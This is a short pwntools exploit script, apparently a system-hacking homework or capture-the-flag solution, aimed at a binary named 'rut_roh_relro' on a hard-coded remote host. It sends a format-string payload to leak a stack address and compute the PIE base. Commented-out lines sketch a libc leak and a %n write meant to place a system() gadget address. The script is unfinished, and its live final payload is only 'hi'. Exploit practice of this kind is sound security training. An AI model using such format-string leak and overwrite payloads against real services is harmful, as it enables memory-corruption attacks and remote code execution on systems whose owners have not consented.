from pwn import *

port = 5000
rem = remote("52.79.50.147", port)

elf = ELF("./WHS/system_hacking_hw/problem/rut_roh_relro")
start_offset = elf.symbols["_start"]
main_offset = elf.symbols["main"]

elf = ELF("./WHS/system_hacking_hw/problem/libc.so.6")
libstart_offset = 6496
system_offset = 0xc961a

payload = b"%97$p"
rem.sendlineafter(b"post?", payload)
rem.recvuntil(b"post:\n")
start_addr = int(rem.recv(14), 16) - 42
pie_base = start_addr - start_offset
main_addr = pie_base + main_offset
print(p64(start_addr))
print(p64(pie_base))

# payload = b"%71$p"
# rem.sendlineafter(b"post?", payload)
# rem.recvuntil(b"post:\n")
# ret_addr = int(rem.recv(14), 16) - 243
# lib_base = ret_addr - libstart_offset
# print(p64(ret_addr))
# print(p64(lib_base))

# system_addr = lib_base + system_offset
# print(p64(system_addr))
# payload = "%{}c".format(system_addr).encode()
# payload += b"%71$n"
payload = b"hi"
print(payload)
rem.sendlineafter(b"post?\n", payload)
msg = rem.recvline()

# rem.interactive()